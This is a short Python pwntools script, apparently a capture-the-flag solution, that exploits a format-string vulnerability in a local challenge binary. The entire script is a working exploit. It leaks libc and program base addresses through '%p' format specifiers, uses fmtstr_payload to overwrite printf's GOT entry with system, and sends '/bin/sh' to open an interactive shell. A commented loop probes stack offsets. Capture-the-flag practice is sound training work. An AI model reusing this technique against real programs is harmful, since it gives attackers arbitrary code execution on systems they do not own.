#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

canary_offset = 23

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe



io = exe.process()
io.recvuntil(':')
io.sendline("%3$p")
leaked = int(io.recvuntil(".").strip().decode()[:-1][9:],16)

libc.address =  leaked - 0x114a37

print(hex(libc.address))

print("search for this one ",leaked)

print("elf baby",hex(exe.got['printf']))

io.recvuntil(':')
io.sendline("%21$p")
base_adr = int(io.recvuntil(".").strip().decode()[:-1][9:],16)

base_offset = 0x55d34ab532f9 - 0x000055d34ab52000
BASE = base_adr - base_offset
print("base here ",hex(BASE))


print_adr = BASE + exe.got['printf']

payload = fmtstr_payload(6, {print_adr:libc.symbols["system"]})
print(payload)

io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()


# for i in range(1,100):
#     io.recvuntil(':')
#     io.sendline(f"%{i}$p")
#     print(f"{i}",io.recvuntil('.'))

